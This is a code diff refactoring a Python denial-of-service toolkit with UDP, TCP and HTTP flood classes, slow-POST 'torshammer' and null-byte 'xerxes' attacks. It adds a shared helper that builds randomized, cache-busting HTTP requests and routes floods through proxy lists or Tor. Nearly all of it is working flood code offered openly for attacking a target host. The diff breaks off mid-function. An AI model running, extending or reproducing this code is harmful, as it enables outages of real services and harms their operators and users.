@@ -31,6 +31,52 @@ if ((termux==False) or (adr==False)):
 
 
 
+
+
+
+
+def setup_http_packet(target,ty,paths,post_field_min,post_field_max,post_min,post_max):
+      pa=random.choice(paths)#bypassing cache engine
+      q=''
+      for i in range(random.randint(2,5)):
+       q+=random.choice(lis)+str(random.randint(1,100000))
+      p=''
+      for i in range(random.randint(2,5)):
+       p+=random.choice(lis)+str(random.randint(1,100000))
+      if '?' in pa:
+       jo='&'
+      else:
+       jo='?' 
+      pa+=jo+q+"="+p
+      #setting random headers
+      for l in range(random.randint(1,5)):
+       ed=random.choice(ec)
+       oi=random.randint(1,3)
+       if oi==2:
+        gy=0
+        while gy<1:
+         df=random.choice(ec)
+         if df!=ed:
+          gy+=1
+        ed+=', '
+        ed+=df
+      l=random.choice(al)
+      for n in range(random.randint(0,5)):
+       l+=';q={},'.format(round(random.uniform(.1,1),1))+random.choice(al)
+      kl=random.randint(1,2)
+      if ty==1:
+       m='GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nReferer: {}\r\nHost: {}\r\n\r\n'.format(pa,random.choice(ua),random.choice(a),l,ed,random.choice(ac),random.randint(100,1000),random.choice(cc),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),target)
+      else:
+       k=''
+       for _ in range(random.randint(post_field_min,post_field_max)):
+        k+=random.choice(lis)
+       j=''
+       for x in range(random.randint(post_min,post_max)):
+        j+=random.choice(lis)
+       par =k+'='+j
+       m= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),l,random.randint(300,1000),len(par),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),target,par)
+      return m
+
 def get_public_dns(timeout=15):
  try:
   return (requests.get('https://public-dns.info/nameservers.txt',timeout=timeout).text).split('\n')
@@ -64,7 +110,7 @@ def reset():#reset all values
 '''
 
 class udp_flood:
- def __init__(self,u,p=80,threads_daemon=False,interval=0.001,min_size=10,max_size=10,connection=True,duration=60,threads=1,limiting=False,logs=False):
+ def __init__(self,u,p=80,threads_daemon=False,interval=0.001,min_size=10,max_size=10,connection=True,duration=60,threads=1,limiting=True,logs=False):
   self.target=u
   self.port=p
   self.interval=interval
@@ -82,10 +128,10 @@ class udp_flood:
    t.daemon=threads_daemon
    t.start()
  def attack(self):
-  time.sleep(1)
-  tm=time.time()
-  size=0
   try:
+   time.sleep(1)
+   tm=time.time()
+   size=0
    while True:
     if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
      break
@@ -94,7 +140,7 @@ class udp_flood:
     try:
      s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
      if self.connection==True:
-      s.connect((self.target,p))
+      s.connect((self.target,self.port))
      msg=''
      for x in range(random.randint(self.min_size,self.max_size)):
       msg+=random.choice(lis)
@@ -149,9 +195,9 @@ class vse_flood:
    t.daemon=threads_daemon
    t.start()
  def attack(self):
-  time.sleep(1)
-  tm=time.time()
   try:
+   time.sleep(1)
+   tm=time.time()
    while True:
     if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
      break
@@ -161,7 +207,7 @@ class vse_flood:
      s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
      if self.connection==True:
       s.connect((self.target,self.port))
-     s.sendto(self.payload,(self.target,p))
+     s.sendto(self.payload,(self.target,self.port))
      self.counter+=1
      if((self.logs==True) and (int(time.time()-tm)==1)):
       sys.stdout.write("\rPackets: {}   ".format(self.counter))
@@ -179,13 +225,18 @@ class vse_flood:
   except:
    pass
  def reset(self):
+   l=[]
    for x in self.__dict__:
     self.__dict__[x]=None
+    l.append(x)
+   for x in l:
+    delattr(self,x)
  def kill(self):
-  self.stop=True
-  a=self.__dict__["counter"]
-  self.reset()
-  return a
+  if 'stop' in dir(self):
+   self.stop=True
+   a=self.__dict__["counter"]
+   self.reset()
+   return a
 
 
 
@@ -210,8 +261,9 @@ class tcp_flood:
    t.daemon=threads_daemon
    t.start()
  def attack(self):
-  time.sleep(1)#give time for all threads to be created
-  while True:
+  try:
+   time.sleep(1)#give time for all threads to be created
+   while True:
     if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
      break
     if self.stop==True:
@@ -239,7 +291,7 @@ class tcp_flood:
        s.send(m.encode('utf-8'))
        self.counter+=1
        if self.logs==True:
-        sys.stdout.write("\rPackets: {} | Bytes: {}   ".format(tcp_counter,len(m)))
+        sys.stdout.write("\rPackets: {} | Bytes: {}   ".format(self.counter,len(m)))
         sys.stdout.flush()
         #print("Packets: {} | Bytes: {}".format(tcp_counter,len(m)))
       except:
@@ -249,15 +301,22 @@ class tcp_flood:
     except:
      pass
     time.sleep(.1)
-  self.kill()
+   self.kill()
+  except:
+   pass
  def reset(self):
+   l=[]
    for x in self.__dict__:
     self.__dict__[x]=None
+    l.append(x)
+   for x in l:
+    delattr(self,x)
  def kill(self):
-  self.stop=True
-  a=self.__dict__["counter"]
-  self.reset()
-  return a
+  if 'stop' in dir(self):
+   self.stop=True
+   a=self.__dict__["counter"]
+   self.reset()
+   return a
  
 '''
   usage:
@@ -274,8 +333,9 @@ class tcp_flood:
 
 
 class http_spam:
- def __init__(self,u,p=80,threads_daemon=False,paths=["/"],threads=256,post_min=5,post_max=10,post_field_max=100,post_field_min=50,timeout=5,round_min=5,round_max=15,interval=0.001,duration=60,logs=False,tor=False):
+ def __init__(self,u,p=80,method=3,threads_daemon=False,paths=["/"],threads=256,post_min=5,post_max=10,post_field_max=100,post_field_min=50,timeout=5,round_min=5,round_max=15,interval=0.001,duration=60,logs=False,tor=False):
   self.logs=logs
+  self.method=method
   self.stop=False
   self.counter=0
   self.start=time.time()
@@ -313,53 +373,16 @@ class http_spam:
      s.connect((self.target,self.port))
      if ((self.port==443) or (self.port==8443)):
       s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
-     for fg in range(random.randint(self.round_min,self.round_max)):
-      if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
-       break
-      if stop==True: 
-       break
-      pa=random.choice(self.paths)#bypassing cache engine
-      q=''
-      for i in range(random.randint(2,5)):
-       q+=random.choice(lis)+str(random.randint(1,100000))
-      p=''
-      for i in range(random.randint(2,5)):
-       p+=random.choice(lis)+str(random.randint(1,100000))
-      if '?' in pa:
-       jo='&'
-      else:
-       jo='?' 
-      pa+=jo+q+"="+p
-      #setting random headers
-      for l in range(random.randint(1,5)):
-       ed=random.choice(ec)
-       oi=random.randint(1,3)
-       if oi==2:
-        gy=0
-        while gy<1:
-         df=random.choice(ec)
-         if df!=ed:
-          gy+=1
-        ed+=', '
-        ed+=df
-      l=random.choice(al)
-      for n in range(random.randint(0,5)):
-       l+=';q={},'.format(round(random.uniform(.1,1),1))+random.choice(al)
-      kl=random.randint(1,2)
-      if kl==1:
-       req="GET"
-       m='GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nReferer: {}\r\nHost: {}\r\n\r\n'.format(pa,random.choice(ua),random.choice(a),l,ed,random.choice(ac),random.randint(100,1000),random.choice(cc),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target)
-      else:
-       req="POST"
-       k=''
-       for _ in range(random.randint(self.post_field_min,self.post_field_max)):
-        k+=random.choice(lis)
-       j=''
-       for x in range(random.randint(self.post_min,self.post_max)):
-        j+=random.choice(lis)
-       par =k+'='+j
-       m= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),l,random.randint(300,1000),len(par),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target,par)
-      try:
+     if self.method==3:
+      ty=random.randint(1,2)
+     else:
+      ty=self.method
+     if ty==1:
+      req="GET"
+     else:
+      req="POST"
+     m=setup_http_packet(self.target,ty,self.paths,self.post_field_min,self.post_field_max,self.post_min,self.post_max)
+     try:
        if self.stop==True:
          break
        s.send(m.encode('utf-8'))
@@ -368,9 +391,9 @@ class http_spam:
         sys.stdout.write("\rRequest: {} | Type: {} | Bytes: {}   ".format(self.counter,req,len(m)))
         sys.stdout.flush()
         #print("Request: {} | Type: {} | Bytes: {}".format(http_counter,req,len(m)))
-      except:
+     except:
        break
-      time.sleep(self.interval)
+     time.sleep(self.interval)
      s.close()
     except:
      pass
@@ -379,18 +402,24 @@ class http_spam:
   except:
    pass
  def reset(self):
+   l=[]
    for x in self.__dict__:
     self.__dict__[x]=None
+    l.append(x)
+   for x in l:
+    delattr(self,x)
  def kill(self):
-  self.stop=True
-  a=self.__dict__["counter"]
-  self.reset()
-  return a
+  if 'stop' in dir(self):
+   self.stop=True
+   a=self.__dict__["counter"]
+   self.reset()
+   return a
 
 
 class prox_http_spam(threading.Thread):
- def __init__(self,u,p=80,threads_daemon=False,scraping_timeout=15,http_list=None,socks4_list=None,socks5_list=None,paths=["/"],threads=256,post_min=5,post_max=10,post_field_max=100,post_field_min=50,timeout=5,round_min=5,round_max=15,interval=0.001,duration=60,logs=False,tor=False):
+ def __init__(self,u,p=80,method=3,threads_daemon=False,scraping_timeout=15,http_list=None,socks4_list=None,socks5_list=None,paths=["/"],threads=256,post_min=5,post_max=10,post_field_max=100,post_field_min=50,timeout=5,round_min=5,round_max=15,interval=0.001,duration=60,logs=False,tor=False):
   self.logs=logs
+  self.method=method
   self.stop=False
   self.counter=0
   self.httplist=http_list
@@ -421,111 +450,83 @@ class prox_http_spam(threading.Thread):
    t.daemon=threads_daemon
    t.start()
  def attack(self):
-  time.sleep(1)
-  while True:
-   if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
+  try:
+   time.sleep(1)
+   while True:
+    if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
      break
-   if self.stop==True:
+    if self.stop==True:
      break
-   try:
-    bot_type=[]
-    if len(self.httplist)>0:
-     bot_type.append("h")
-    if len(self.socks4list)>0:
-     bot_type.append("s4")
-    if len(self.socks5list)>0:
-     bot_type.append("s5")
-    z=random.choice(bot_type)
-    if z=="h":
-     line=random.choice(self.httplist)
-    elif z=="s4":
-     line=random.choice(self.socks4list)
-    elif z=="s5":
-     line=random.choice(self.socks5list)
-    ipp=line.split(":")[0].split("=")[0]
-    pp=line.split(":")[1].split("=")[0]
-    s =socks.socksocket()
-    if z=="h":
-     s.setproxy(socks.PROXY_TYPE_HTTP, str(ipp), int(pp), True)
-    elif z=="s4":
-     s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
-    elif z=="s5":
-     s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
-    if z=="h":
-     s.settimeout(self.timeout)
-    s.connect((self.target,self.port))
-    if ((self.port==443) or (self.port==8443)):
+    try:
+     bot_type=[]
+     if len(self.httplist)>0:
+      bot_type.append("h")
+     if len(self.socks4list)>0:
+      bot_type.append("s4")
+     if len(self.socks5list)>0:
+      bot_type.append("s5")
+     z=random.choice(bot_type)
+     if z=="h":
+      line=random.choice(self.httplist)
+     elif z=="s4":
+      line=random.choice(self.socks4list)
+     elif z=="s5":
+      line=random.choice(self.socks5list)
+     ipp=line.split(":")[0].split("=")[0]
+     pp=line.split(":")[1].split("=")[0]
+     s =socks.socksocket()
+     if z=="h":
+      s.setproxy(socks.PROXY_TYPE_HTTP, str(ipp), int(pp), True)
+     elif z=="s4":
+      s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
+     elif z=="s5":
+      s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
+     if z=="h":
+      s.settimeout(self.timeout)
+     s.connect((self.target,self.port))
+     if ((self.port==443) or (self.port==8443)):
       s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
-    for fg in range(random.randint(self.round_min,self.round_max)):
-     if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
-       break
-     if stop==True:
-      break
-     for l in range(random.randint(1,5)):
-      ed=random.choice(ec)
-      oi=random.randint(1,3)
-      if oi==2:
-       gy=0
-       while gy<1:
-        df=random.choice(ec)
-        if df!=ed:
-         gy+=1
-       ed+=', '
-       ed+=df
-     l=random.choice(al)
-     for n in range(random.randint(0,5)):
-      l+=';q={},'.format(round(random.uniform(.1,1),1))+random.choice(al)
-     pa=random.choice(paths)
-     q=''
-     for i in range(random.randint(2,5)):
-      q+=random.choice(lis)+str(random.randint(1,100000))
-     p=''
-     for i in range(random.randint(2,5)):
-      p+=random.choice(lis)+str(random.randint(1,100000))
-     if '?' in pa:
-      jo='&'
+     if self.method==3:
+      ty=random.randint(1,2)
      else:
-      jo='?' 
-     pa+=jo+q+"="+p
-     kl=random.randint(1,2)
-     if kl==1:
+      ty=self.method
+     if ty==1:
       req="GET"
-      m='GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nReferer: {}\r\nHost: {}\r\n\r\n'.format(pa,random.choice(ua),random.choice(a),l,ed,random.choice(ac),random.randint(100,1000),random.choice(cc),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target)
      else:
       req="POST"
-      k=''
-      for _ in range(random.randint(self.post_field_min,self.post_field_max)):
-       k+=random.choice(lis)
-      j=''
-      for x in range(random.randint(self.post_min,self.post_max)):
-       j+=random.choice(lis)
-      par =k+'='+j
-      m= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),l,random.randint(300,1000),len(par),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target,par)
+     m=setup_http_packet(self.target,ty,self.paths,self.post_field_min,self.post_field_max,self.post_min,self.post_max)
      try:
-      if stop==True:
-        break
-      s.send(m.encode('utf-8'))
-      self.counter+=1
-      if self.logs==True:
+       if stop==True:
+         break
+       s.send(m.encode('utf-8'))
+       self.counter+=1
+       if self.logs==True:
         sys.stdout.write("\rBot: {} | Request: {} | Type: {} | Bytes: {}   ".format(ipp,self.counter,req,len(m)))
         sys.stdout.flush()
         #print("Bot: {} | Request: {} | Type: {} | Bytes: {}".format(ipp,lulzer_counter,req,len(m)))
      except:
-      break
+       break
      time.sleep(self.interval)
-    s.close()
-   except:
-    pass
-   time.sleep(.1)
-  self.kill()
+     s.close()
+    except:
+     pass
+    time.sleep(.1)
+   self.kill()
+  except:
+   pass
  def reset(self):
+   l=[]
    for x in self.__dict__:
     self.__dict__[x]=None
+    l.append(x)
+   for x in l:
+    delattr(self,x)
  def kill(self):
-  self.stop=True
-  a=self.__dict__["counter"]
-  self.reset()
-  return a
+  if 'stop' in dir(self):
+   self.stop=True
+   a=self.__dict__["counter"]
+   self.reset()
+   return a
 
 
 class torshammer:
@@ -546,59 +547,67 @@ class torshammer:
    t.daemon=threads_daemon
    t.start()
  def attack(self):
-  time.sleep(1)
-  while True:
-   if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
+  try:
+   time.sleep(1)
+   while True:
+    if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
      break
-   if self.stop==True:
+    if self.stop==True:
      break
-   try:
-    s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
-    if self.tor==False:
-     s.settimeout(self.timeout)
-    if self.tor==True:
-     s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
-    s.connect((self.target,self.port))
-    self.counter+=1
-    if self.logs==True:
+    try:
+     s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
+     if self.tor==False:
+      s.settimeout(self.timeout)
+     if self.tor==True:
+      s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
+     s.connect((self.target,self.port))
+     if ((self.port==443) or (self.port==8443)):
+      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
+     self.counter+=1
+     if self.logs==True:
         sys.stdout.write("\rConnected to {}:{}...".format(self.target,self.port))
         sys.stdout.flush()
         #print("Connected to {}:{}...".format(self.target,self.port))
-    if ((self.port==443) or (self.port==8443)):
-     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
-    q=random.randint(self.min_content,self.max_content)
-    s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(random.choice(paths),random.choice(ua),random.randint(300,1000),q,(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target).encode('utf-8'))
-    for i in range(q):
-     if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
-      break
-     if self.stop==True:
-      break
-     h=random.choice(lis)
-     try:
-      s.send(h.encode('utf-8'))
-      if self.logs==True:
+     q=random.randint(self.min_content,self.max_content)
+     s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(random.choice(paths),random.choice(ua),random.randint(300,1000),q,(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target).encode('utf-8'))
+     for i in range(q):
+      if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
+       break
+      if self.stop==True:
+       break
+      h=random.choice(lis)
+      try:
+       s.send(h.encode('utf-8'))
+       if self.logs==True:
         sys.stdout.write("\rPosted: {}".format(h))
         sys.stdout.flush()
         #print("Posted: {}".format(h))
-      time.sleep(random.uniform(.1,3))
-     except:
-      break
-    s.close()
-   except:
-    pass
-   self.counter-=1
-   time.sleep(.1)
-   if self.stop==True:
-    break
-  self.kill()
+       time.sleep(random.uniform(.1,3))
+      except:
+       break
+     s.close()
+    except:
+     pass
+    self.counter-=1
+    time.sleep(.1)
+    if self.stop==True:
+     break
+   self.kill()
+  except:
+   pass
  def reset(self):
+   l=[]
    for x in self.__dict__:
     self.__dict__[x]=None
+    l.append(x)
+   for x in l:
+    delattr(self,x)
  def kill(self):
-  self.stop=True
-  a=self.__dict__["counter"]
-  self.reset()
-  return a
+  if 'stop' in dir(self):
+   self.stop=True
+   a=self.__dict__["counter"]
+   self.reset()
+   return a
 
 
 
@@ -628,73 +637,81 @@ class prox_hammer:
    t.daemon=threads_daemon
    t.start()
  def attack(self):
-  time.sleep(1)
-  while True:
-   if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
+  try:
+   time.sleep(1)
+   while True:
+    if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
      break
-   if self.stop==True:
+    if self.stop==True:
      break
-   try:
-    bot_type=[]
-    if len(self.httplist)>0:
-     bot_type.append("h")
-    if len(self.socks4list)>0:
-     bot_type.append("s4")
-    if len(self.socks5list)>0:
-     bot_type.append("s5")
-    z=random.choice(bot_type)
-    if z=="h":
-     line=random.choice(self.httplist)
-    elif z=="s4":
-     line=random.choice(self.socks4list)
-    elif z=="s5":
-     line=random.choice(self.socks5list)
-    ipp=line.split(":")[0].split("=")[0]
-    pp=line.split(":")[1].split("=")[0]
-    s =socks.socksocket()
-    if z=="h":
-     s.setproxy(socks.PROXY_TYPE_HTTP, str(ipp), int(pp), True)
-    elif z=="s4":
-     s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
-    elif z=="s5":
-     s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
-    if z=="h":
-     s.settimeout(self.timeout)
-    s.connect((self.target,self.port))
-    self.counter+=1
-    if ((self.port==443)or(self.port==8443)):
-     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
-    q=random.randint(self.min_content,self.max_content)
-    s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(random.choice(paths),random.choice(ua),random.randint(300,1000),q,(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target).encode('utf-8'))
-    for i in range(q):
-     if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
-      break
-     if self.stop==True:
-      break
-     h=random.choice(lis)
-     try:
-      s.send(h.encode('utf-8'))
-      if self.logs==True:
+    try:
+     bot_type=[]
+     if len(self.httplist)>0:
+      bot_type.append("h")
+     if len(self.socks4list)>0:
+      bot_type.append("s4")
+     if len(self.socks5list)>0:
+      bot_type.append("s5")
+     z=random.choice(bot_type)
+     if z=="h":
+      line=random.choice(self.httplist)
+     elif z=="s4":
+      line=random.choice(self.socks4list)
+     elif z=="s5":
+      line=random.choice(self.socks5list)
+     ipp=line.split(":")[0].split("=")[0]
+     pp=line.split(":")[1].split("=")[0]
+     s =socks.socksocket()
+     if z=="h":
+      s.setproxy(socks.PROXY_TYPE_HTTP, str(ipp), int(pp), True)
+     elif z=="s4":
+      s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
+     elif z=="s5":
+      s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
+     if z=="h":
+      s.settimeout(self.timeout)
+     s.connect((self.target,self.port))
+     self.counter+=1
+     if ((self.port==443)or(self.port==8443)):
+      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
+     q=random.randint(self.min_content,self.max_content)
+     s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(random.choice(paths),random.choice(ua),random.randint(300,1000),q,(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target).encode('utf-8'))
+     for i in range(q):
+      if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
+       break
+      if self.stop==True:
+       break
+      h=random.choice(lis)
+      try:
+       s.send(h.encode('utf-8'))
+       if self.logs==True:
         sys.stdout.write("\rPosted: {} --> {}".format(h,ipp))
         sys.stdout.flush()
         #print("Posted: {} --> {}".format(h,ipp))
-      time.sleep(random.uniform(.1,3))
-     except:
-      break
-    s.close()
-   except:
-    pass
-   self.counter-=1
-   time.sleep(.1)
-  self.kill()
+       time.sleep(random.uniform(.1,3))
+      except:
+       break
+     s.close()
+    except:
+     pass
+    self.counter-=1
+    time.sleep(.1)
+   self.kill()
+  except:
+   pass
  def reset(self):
+   l=[]
    for x in self.__dict__:
     self.__dict__[x]=None
+    l.append(x)
+   for x in l:
+    delattr(self,x)
  def kill(self):
-  self.stop=True
-  a=self.__dict__["counter"]
-  self.reset()
-  return a
+  if 'stop' in dir(self):
+   self.stop=True
+   a=self.__dict__["counter"]
+   self.reset()
+   return a
 
 
 class xerxes:
@@ -715,51 +732,59 @@ class xerxes:
    t.start()
    self.id_key+=1
  def attack(self):
-  x=self.id_key
-  time.sleep(1)
-  while True:
-   if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
+  try:
+   x=self.id_key
+   time.sleep(1)
+   while True:
+    if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
      break
-   if self.stop==True:
+    if self.stop==True:
      break
-   try:
-    s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
-    if self.tor==False:
-     s.settimeout(self.timeout)
-    if self.tor==True:
-     s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
-    s.connect((self.target,self.port))
-    self.counter+=1
-    """if self.logs==True:
+    try:
+     s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
+     if self.tor==False:
+      s.settimeout(self.timeout)
+     if self.tor==True:
+      s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
+     s.connect((self.target,self.port))
+     self.counter+=1
+     """if self.logs==True:
      #print("[Connected to {}:{}]".format(self.target,self.port))
      sys.stdout.write("\r[Connected to {}:{}]".format(self.target,self.port))
      sys.stdout.flush()"""
-    while True:
-     if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
-      break
-     if self.stop==True:
-      break
-     try:
-      s.send("\x00".encode('utf-8'))#send NULL character
-      if self.logs==True:
-       sys.stdout.write("\r[{}: Voly sent]    ".format(x))
-       sys.stdout.flush()
-     except:
-      break
-     time.sleep(.2)
-   except:
+     while True:
+      if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
+       break
+      if self.stop==True:
+       break
+      try:
+       s.send("\x00".encode('utf-8'))#send NULL character
+       if self.logs==True:
+        sys.stdout.write("\r[{}: Voly sent]    ".format(x))
+        sys.stdout.flush()
+      except:
+       break
+      time.sleep(.2)
+    except:
       pass
-   self.counter-=1
-   time.sleep(.3)
-  self.kill()
+    self.counter-=1
+    time.sleep(.3)
+   self.kill()
+  except:
+   pass
  def reset(self):
+   l=[]
    for x in self.__dict__:
     self.__dict__[x]=None
+    l.append(x)
+   for x in l:
+    delattr(self,x)
  def kill(self):
-  self.stop=True
-  a=self.__dict__["counter"]
-  self.reset()
-  return a
+  if 'stop' in dir(self):
+   self.stop=True
+   a=self.__dict__["counter"]
+   self.reset()
+   return a
 
 
 class prox_xerxes:
@@ -788,67 +813,75 @@ class prox_xerxes:
    t.start()
    self.id_key+=1
  def attack(self):
-  x=self.id_key
-  time.sleep(1)
-  while True:
-   if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
+  try:
+   x=self.id_key
+   time.sleep(1)
+   while True:
+    if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
      break
-   if self.stop==True:
+    if self.stop==True:
      break
-   try:
-    bot_type=[]
-    if len(self.httplist)>0:
-     bot_type.append("h")
-    if len(self.socks4list)>0:
-     bot_type.append("s4")
-    if len(self.socks5list)>0:
-     bot_type.append("s5")
-    z=random.choice(bot_type)
-    if z=="h":
-     line=random.choice(self.httplist)
-    elif z=="s4":
-     line=random.choice(self.socks4list)
-    elif z=="s5":
-     line=random.choice(self.socks5list)
-    ipp=line.split(":")[0].split("=")[0]
-    pp=line.split(":")[1].split("=")[0]
-    s =socks.socksocket()
-    if z=="h":
-     s.setproxy(socks.PROXY_TYPE_HTTP, str(ipp), int(pp), True)
-    elif z=="s4":
-     s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
-    elif z=="s5":
-     s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
-    if z=="h":
-     s.settimeout(self.timeout)
-    s.connect((self.target,self.port))
-    self.counter+=1
-    while True:
-     if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
-      break
-     if self.stop==True:
-      break
-     try:
-      s.send("\x00".encode('utf-8'))#send NULL character
-      if self.logs==True:
-       sys.stdout.write("\r[{}: Voly sent-->{}]     ".format(x,ipp))
-       sys.stdout.flush()
-     except:
-      break
-     time.sleep(.2)
-   except:
-    pass
-   self.counter-=1
-   time.sleep(.3)
-  self.kill()
+    try:
+     bot_type=[]
+     if len(self.httplist)>0:
+      bot_type.append("h")
+     if len(self.socks4list)>0:
+      bot_type.append("s4")
+     if len(self.socks5list)>0:
+      bot_type.append("s5")
+     z=random.choice(bot_type)
+     if z=="h":
+      line=random.choice(self.httplist)
+     elif z=="s4":
+      line=random.choice(self.socks4list)
+     elif z=="s5":
+      line=random.choice(self.socks5list)
+     ipp=line.split(":")[0].split("=")[0]
+     pp=line.split(":")[1].split("=")[0]
+     s =socks.socksocket()
+     if z=="h":
+      s.setproxy(socks.PROXY_TYPE_HTTP, str(ipp), int(pp), True)
+     elif z=="s4":
+      s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
+     elif z=="s5":
+      s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
+     if z=="h":
+      s.settimeout(self.timeout)
+     s.connect((self.target,self.port))
+     self.counter+=1
+     while True:
+      if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
+       break
+      if self.stop==True:
+       break
+      try:
+       s.send("\x00".encode('utf-8'))#send NULL character
+       if self.logs==True:
